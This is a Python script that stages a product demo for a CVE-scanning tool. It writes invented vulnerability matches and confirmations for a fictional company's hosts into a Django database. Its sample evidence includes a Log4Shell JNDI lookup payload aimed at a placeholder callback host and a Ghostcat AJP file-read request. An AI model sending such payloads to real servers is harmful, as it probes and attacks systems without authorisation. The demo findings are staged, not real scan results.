"""The second step of the 1.4 tour: lets cvENGINE detect CVEs on the demo hosts while the recording runs (scripts/demo/record_tour.js calls it). Run it AFTER
scripts/demo/seed_demo.py, in the same database, once per phase:

    PHASE=arm      python3 manage.py shell < ../scripts/demo/stage_live.py   # a scan is running (Nuclei), the Sentinels have just checked in
    PHASE=detect1  python3 manage.py shell < ../scripts/demo/stage_live.py   # two CVE matches arrive (detect2: three more; detect: all five at once)
    PHASE=confirm  python3 manage.py shell < ../scripts/demo/stage_live.py   # a check reproduces two of them: smoke turns to fire
    PHASE=done     python3 manage.py shell < ../scripts/demo/stage_live.py   # the scan finishes

Nothing is edited on screen. The matches are written by the function the correlation stage uses (``correlation.save_matches``), the confirmation is the
write a template check makes (``template_result`` and a finding with the request and response), and the follow-up is the one the product runs after
evidence lands (``scoring.evidence_arrived``: rescore the hosts, make every dashboard snapshot re-read). Every host and address is the fictional demo company's.
"""
import os
import time
from datetime import timedelta

from django.utils import timezone

from cveFeed import correlation, scoring
from cveFeed.models import CVEEntry, CVEMatch
from startScan.models import ScanActivity, ScanHistory, Subdomain, Vulnerability

PHASE = os.environ.get('PHASE', '')
GO_FILE = os.environ.get('GO_FILE', '')  # the recording starts this script early (Django takes seconds to start) and creates this file at the moment the rows should be written
while GO_FILE and not os.path.exists(GO_FILE):
    time.sleep(0.05)
NOW = timezone.now()
BATCHES = {
    'detect1': [('blog.acme-example.com', 'CVE-2021-41773', 'Apache httpd', '2.4.49', 'Apache/2.4.49 (Unix)'),
                ('tc-portal.acme-example.com', 'CVE-2020-1938', 'Apache Tomcat', '9.0.30', 'Apache Tomcat/9.0.30')],
    'detect2': [('elastic.acme-cloud-example.org', 'CVE-2021-44228', 'Elasticsearch', '7.10.2', 'Elasticsearch 7.10.2 (bundled Log4j 2.11)'),
                ('ts01.acme-example.com', 'CVE-2019-0708', 'Microsoft Terminal Services', '6.1.7601', 'Microsoft Terminal Services 6.1.7601'),
                ('forum.acme-example.com', 'CVE-2019-11043', 'PHP', '7.3.33', 'X-Powered-By: PHP/7.3.33 (nginx, php-fpm)')],
}
CONFIRM = {  # host: (CVE, finding name, request, response)
    'tc-portal.acme-example.com': ('CVE-2020-1938', 'Apache Tomcat AJP file read (Ghostcat)',
                                   'AJP13 forward request, attribute javax.servlet.include.path_info=/WEB-INF/web.xml',
                                   '<web-app version="4.0"> ... <servlet-name>reports</servlet-name> ... (the file was served by the AJP connector, port 8009)'),
    'elastic.acme-cloud-example.org': ('CVE-2021-44228', 'Log4Shell reachable (out-of-band callback received)',
                                       'GET /_search?q=${jndi:ldap://oast.demo.invalid/a}',
                                       'The callback server logged one DNS lookup from 192.0.2.10 for the unique token, 1.4 s after the request.'),
}
sub_of = lambda name: Subdomain.objects.filter(name=name).order_by('-id').first()  # noqa: E731

if PHASE == 'arm':
    from agentapi.models import Agent
    for agent in Agent.objects.filter(kind='scanner'):
        Agent.objects.filter(pk=agent.pk).update(last_seen=NOW - timedelta(seconds=4 + agent.pk))
    scan = ScanHistory.objects.filter(domain__name='acme-example.com').order_by('-id').first()
    ScanHistory.objects.filter(pk=scan.pk).update(scan_status=1, start_scan_date=NOW - timedelta(minutes=2), stop_scan_date=None)
    ScanActivity.objects.filter(scan_of=scan).update(status=1, title='Nuclei: CVE templates', time=NOW)
    from cveFeed.views import bump_stats_revision
    bump_stats_revision()
elif PHASE in ('detect', *BATCHES):
    batch = BATCHES['detect1'] + BATCHES['detect2'] if PHASE == 'detect' else BATCHES[PHASE]
    rows = []
    for host, cve_id, product, version, banner in batch:
        sub = sub_of(host)
        cve = CVEEntry.objects.get(cve_id=cve_id)
        rows.append({'cve_entry_id': cve.id, 'subdomain_id': sub.id, 'source': 'version', 'matched_product': product, 'matched_version': version,
                     'version_in_range': True, 'confidence': 0.9, 'scan_history_id': sub.scan_history_id, 'distro_status': '', 'distro_fixed_version': '',
                     'evidence': {'raw_version': version, 'banner': banner, 'method': 'probed'}})
    correlation.save_matches(rows)
    scoring.evidence_arrived(CVEMatch.objects.filter(cve_entry__cve_id__in=[r[1] for r in batch],
                                                     subdomain__name__in=[r[0] for r in batch]).values_list('pk', flat=True))
elif PHASE == 'confirm':
    ids = []
    for host, (cve_id, title, request, response) in CONFIRM.items():
        sub = sub_of(host)
        match = CVEMatch.objects.get(cve_entry__cve_id=cve_id, subdomain=sub)
        CVEMatch.objects.filter(pk=match.pk).update(template_result='vulnerable', template_id=cve_id.lower(), template_tested_at=NOW, ai_verdict='confirmed',
                                                    ai_reason='A check reproduced the flaw on this host.')
        Vulnerability.objects.create(scan_history=sub.scan_history, target_domain=sub.target_domain, subdomain=sub, name=title, severity=4, template_id=cve_id.lower(),
                                     source='nuclei', type='network', http_url=f'https://{sub.name}/', request=request, response=response, open_status=True, discovered_date=NOW)
        ids.append(match.pk)
    scoring.evidence_arrived(ids)
elif PHASE == 'done':
    scan = ScanHistory.objects.filter(domain__name='acme-example.com').order_by('-id').first()
    ScanHistory.objects.filter(pk=scan.pk).update(scan_status=2, stop_scan_date=NOW)
    ScanActivity.objects.filter(scan_of=scan).update(status=2, title='Nuclei', time=NOW)
    from cveFeed.views import bump_stats_revision
    bump_stats_revision()
else:
    raise SystemExit('PHASE must be arm, detect (or detect1, detect2), confirm or done')
print('stage', PHASE, 'ok')
